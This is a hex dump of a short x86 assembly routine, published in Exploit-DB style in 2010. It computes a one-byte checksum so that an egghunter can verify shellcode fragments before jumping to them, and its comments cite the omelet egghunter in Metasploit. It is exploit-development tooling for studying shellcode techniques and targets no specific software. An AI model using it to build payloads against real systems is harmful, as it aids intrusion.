00000000  3b 45 78 70 6c 6f 69 74  20 54 69 74 6c 65 3a 20  |;Exploit Title: |
00000010  53 68 65 6c 6c 63 6f 64  65 20 43 68 65 63 6b 73  |Shellcode Checks|
00000020  75 6d 20 52 6f 75 74 69  6e 65 0d 0a 3b 44 61 74  |um Routine..;Dat|
00000030  65 3a 20 53 65 70 74 20  31 20 32 30 31 30 0d 0a  |e: Sept 1 2010..|
00000040  3b 41 75 74 68 6f 72 3a  20 64 69 6a 69 74 61 6c  |;Author: dijital|
00000050  31 0d 0a 3b 53 6f 66 74  77 61 72 65 20 4c 69 6e  |1..;Software Lin|
00000060  6b 3a 20 20 68 74 74 70  3a 2f 2f 77 77 77 2e 63  |k:  http://www.c|
00000070  69 70 68 65 72 6d 6f 6e  6b 2e 6e 65 74 2f 63 6f  |iphermonk.net/co|
00000080  64 65 2f 65 78 70 6c 6f  69 74 73 2f 73 68 65 6c  |de/exploits/shel|
00000090  6c 63 6f 64 65 2d 63 68  65 63 6b 73 75 6d 2e 61  |lcode-checksum.a|
000000a0  73 6d 0d 0a 3b 54 65 73  74 65 64 20 6f 6e 3a 20  |sm..;Tested on: |
000000b0  4f 6d 65 6c 65 74 20 48  75 6e 74 65 72 20 53 68  |Omelet Hunter Sh|
000000c0  65 6c 6c 63 6f 64 65 20  69 6e 20 4d 53 46 0d 0a  |ellcode in MSF..|
000000d0  20 0d 0a 5b 42 49 54 53  20 33 32 5d 0d 0a 20 0d  | ..[BITS 32].. .|
000000e0  0a 3b 41 75 74 68 6f 72  3a 20 52 6f 6e 20 48 65  |.;Author: Ron He|
000000f0  6e 72 79 20 2d 20 64 69  6a 69 74 61 6c 31 0d 0a  |nry - dijital1..|
00000100  3b 45 6d 61 69 6c 3a 20  72 6c 68 40 63 69 70 68  |;Email: rlh@ciph|
00000110  65 72 6d 6f 6e 6b 2e 6e  65 74 0d 0a 3b 53 69 74  |ermonk.net..;Sit|
00000120  65 3a 20 68 74 74 70 3a  2f 2f 77 77 77 2e 63 69  |e: http://www.ci|
00000130  70 68 65 72 6d 6f 6e 6b  2e 6e 65 74 0d 0a 3b 47  |phermonk.net..;G|
00000140  72 65 65 74 7a 20 74 6f  20 45 78 70 6c 6f 69 74  |reetz to Exploit|
00000150  2d 64 62 20 61 6e 64 20  54 65 61 6d 20 43 6f 72  |-db and Team Cor|
00000160  65 6c 61 6e 0d 0a 20 0d  0a 3b 4f 6b 2e 2e 2e 20  |elan.. ..;Ok... |
00000170  63 6f 75 70 6c 65 20 6f  66 20 61 73 73 75 6d 70  |couple of assump|
00000180  74 69 6f 6e 73 20 77 69  74 68 20 74 68 69 73 20  |tions with this |
00000190  63 6f 64 65 2e 20 46 69  72 73 74 2c 20 77 65 27  |code. First, we'|
000001a0  72 65 20 75 73 69 6e 67  20 61 20 73 69 6e 67 6c  |re using a singl|
000001b0  65 0d 0a 3b 62 79 74 65  20 61 73 20 74 68 65 20  |e..;byte as the |
000001c0  63 68 65 63 6b 73 75 6d  20 77 68 69 63 68 20 67  |checksum which g|
000001d0  69 76 65 73 20 75 73 20  61 20 31 20 69 6e 20 32  |ives us a 1 in 2|
000001e0  35 35 20 6f 72 20 7e 30  2e 33 39 25 20 63 68 61  |55 or ~0.39% cha|
000001f0  6e 63 65 20 6f 66 20 61  0d 0a 3b 63 6f 6c 6c 69  |nce of a..;colli|
00000200  73 69 6f 6e 2e 0d 0a 3b  57 65 20 63 6f 6e 73 69  |sion...;We consi|
00000210  64 65 72 20 74 68 69 73  20 61 20 77 6f 72 74 68  |der this a worth|
00000220  77 68 69 6c 65 20 72 69  73 6b 20 67 69 76 65 6e  |while risk given|
00000230  20 74 68 65 20 6f 76 65  72 61 6c 6c 20 73 69 7a  | the overall siz|
00000240  65 20 6f 66 20 74 68 65  20 63 6f 64 65 3b 20 31  |e of the code; 1|
00000250  38 20 62 79 74 65 73 2e  0d 0a 20 0d 0a 3b 54 68  |8 bytes... ..;Th|
00000260  65 72 65 20 61 72 65 20  61 20 63 6f 75 70 6c 65  |ere are a couple|
00000270  20 77 61 79 73 20 74 6f  20 69 6d 70 6c 65 6d 65  | ways to impleme|
00000280  6e 74 20 74 68 69 73 2c  20 62 75 74 20 61 20 67  |nt this, but a g|
00000290  6f 6f 64 20 65 78 61 6d  70 6c 65 20 69 73 20 68  |ood example is h|
000002a0  6f 77 20 69 74 0d 0a 3b  77 61 73 20 75 73 65 64  |ow it..;was used|
000002b0  20 69 6e 20 50 65 74 65  72 20 56 61 6e 20 45 65  | in Peter Van Ee|
000002c0  63 6b 68 6f 75 74 74 65  27 73 20 6f 6d 65 6c 65  |ckhoutte's omele|
000002d0  74 20 65 67 67 68 75 6e  74 65 72 20 6d 69 78 69  |t egghunter mixi|
000002e0  6e 20 74 68 61 74 20 77  61 73 20 72 65 63 65 6e  |n that was recen|
000002f0  74 6c 79 0d 0a 3b 61 64  64 65 64 20 74 6f 20 74  |tly..;added to t|
00000300  68 65 20 4d 65 74 61 73  70 6c 6f 69 74 20 46 72  |he Metasploit Fr|
00000310  61 6d 65 77 6f 72 6b 2e  0d 0a 20 0d 0a 3b 57 65  |amework... ..;We|
00000320  27 72 65 20 75 73 69 6e  67 20 61 20 31 20 62 79  |'re using a 1 by|
00000330  74 65 20 66 6f 6f 74 65  72 20 61 74 20 74 68 65  |te footer at the|
00000340  20 65 6e 64 20 6f 66 20  74 68 65 20 73 68 65 6c  | end of the shel|
00000350  6c 63 6f 64 65 20 74 68  61 74 20 63 6f 6e 74 61  |lcode that conta|
00000360  69 6e 73 20 74 68 65 0d  0a 3b 63 68 65 63 6b 73  |ins the..;checks|
00000370  75 6d 20 67 65 6e 65 72  61 74 65 64 20 61 74 20  |um generated at |
00000380  73 68 65 6c 6c 63 6f 64  65 20 63 72 65 61 74 69  |shellcode creati|
00000390  6f 6e 2e 0d 0a 20 0d 0a  3b 20 56 61 72 69 61 62  |on... ..; Variab|
000003a0  6c 65 73 20 65 61 78 3a  20 61 63 63 75 6d 75 6c  |les eax: accumul|
000003b0  61 74 6f 72 0d 0a 3b 20  20 20 20 20 20 20 20 20  |ator..;         |
000003c0  20 20 65 64 78 3a 20 70  6f 69 6e 74 73 20 74 6f  |  edx: points to|
000003d0  20 63 75 72 72 65 6e 74  20 62 79 74 65 20 69 6e  | current byte in|
000003e0  20 73 68 65 6c 6c 63 6f  64 65 0d 0a 3b 20 20 20  | shellcode..;   |
000003f0  20 20 20 20 20 20 20 20  65 63 78 3a 20 63 6f 75  |        ecx: cou|
00000400  6e 74 65 72 0d 0a 20 0d  0a 65 67 67 5f 73 69 7a  |nter.. ..egg_siz|
00000410  65 20 65 71 75 20 30 78  37 61 20 20 20 20 20 20  |e equ 0x7a      |
00000420  20 3b 77 65 27 72 65 20  74 65 73 74 69 6e 67 20  | ;we're testing |
00000430  31 32 32 20 62 79 74 65  73 20 69 6e 20 74 68 69  |122 bytes in thi|
00000440  73 20 69 6e 73 74 61 6e  63 65 0d 0a 20 0d 0a 66  |s instance.. ..f|
00000450  69 6e 64 5f 65 67 67 3a  0d 0a 20 0d 0a 78 6f 72  |ind_egg:.. ..xor|
00000460  20 65 63 78 2c 20 65 63  78 20 20 20 20 20 20 20  | ecx, ecx       |
00000470  20 20 20 20 20 3b 7a 65  72 6f 20 74 68 65 20 63  |     ;zero the c|
00000480  6f 75 6e 74 65 72 0d 0a  78 6f 72 20 65 61 78 2c  |ounter..xor eax,|
00000490  20 65 61 78 20 20 20 20  20 20 20 20 20 20 20 20  | eax            |
000004a0  3b 7a 65 72 6f 20 74 68  65 20 61 63 63 75 6d 6c  |;zero the accuml|
000004b0  61 74 6f 72 0d 0a 20 0d  0a 63 61 6c 63 5f 63 68  |ator.. ..calc_ch|
000004c0  6b 73 75 6d 5f 6c 6f 6f  70 3a 0d 0a 61 64 64 20  |ksum_loop:..add |
000004d0  61 6c 2c 20 62 79 74 65  20 5b 65 64 78 2b 65 63  |al, byte [edx+ec|
000004e0  78 5d 20 20 3b 61 64 64  20 74 68 65 20 62 79 74  |x]  ;add the byt|
000004f0  65 20 74 6f 20 72 75 6e  6e 69 6e 67 20 74 6f 74  |e to running tot|
00000500  61 6c 0d 0a 69 6e 63 20  65 63 78 20 20 20 20 20  |al..inc ecx     |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 3b 69 6e 63  |            ;inc|
00000520  72 65 6d 65 6e 74 20 74  68 65 20 63 6f 75 6e 74  |rement the count|
00000530  65 72 0d 0a 63 6d 70 20  63 6c 2c 20 65 67 67 5f  |er..cmp cl, egg_|
00000540  73 69 7a 65 20 20 20 20  20 20 20 20 3b 63 6d 70  |size        ;cmp|
00000550  20 63 6f 75 6e 74 65 72  20 74 6f 20 65 67 67 5f  | counter to egg_|
00000560  73 69 7a 65 0d 0a 6a 6e  7a 20 63 61 6c 63 5f 63  |size..jnz calc_c|
00000570  68 6b 73 75 6d 5f 6c 6f  6f 70 20 20 20 20 3b 69  |hksum_loop    ;i|
00000580  66 20 69 74 27 73 20 6e  6f 74 20 65 71 75 61 6c  |f it's not equal|
00000590  20 72 65 70 65 61 74 0d  0a 20 0d 0a 74 65 73 74  | repeat.. ..test|
000005a0  5f 63 6b 6b 73 75 6d 3a  0d 0a 63 6d 70 20 61 6c  |_ckksum:..cmp al|
000005b0  2c 20 62 79 74 65 20 5b  65 64 78 2b 65 63 78 5d  |, byte [edx+ecx]|
000005c0  20 20 3b 63 6d 70 20 65  61 78 20 77 69 74 68 20  |  ;cmp eax with |
000005d0  31 20 62 79 74 65 20 63  68 65 63 6b 73 75 6d 0d  |1 byte checksum.|
000005e0  0a 6a 6e 7a 20 66 69 6e  64 5f 65 67 67 20 20 20  |.jnz find_egg   |
000005f0  20 20 20 20 20 20 20 20  20 3b 73 65 61 72 63 68  |         ;search|
00000600  20 66 6f 72 20 61 6e 6f  74 68 65 72 20 65 67 67  | for another egg|
00000610  20 69 66 20 63 68 65 63  6b 73 75 6d 20 69 73 20  | if checksum is |
00000620  62 6f 67 75 73                                    |bogus|
00000625
